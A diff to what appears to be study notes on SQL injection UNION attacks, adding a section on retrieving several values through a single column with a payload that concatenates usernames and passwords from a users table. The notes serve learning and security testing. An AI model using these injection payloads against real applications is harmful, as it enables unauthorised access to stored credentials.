@@ -185,5 +185,13 @@ Checking same UNION and columns holding text methodology
 Pull data out
 
 ```
-' UNION SELECT username, password from users--
+' UNION SELECT username, password FROM users--
+```
+
+### SQL injection UNION attack, retrieving multiple values in a single column
+
+We can concatenate two values into one to pull from a single column
+
+```
+' UNION SELECT NULL, username||'~'||password FROM users--
 ```
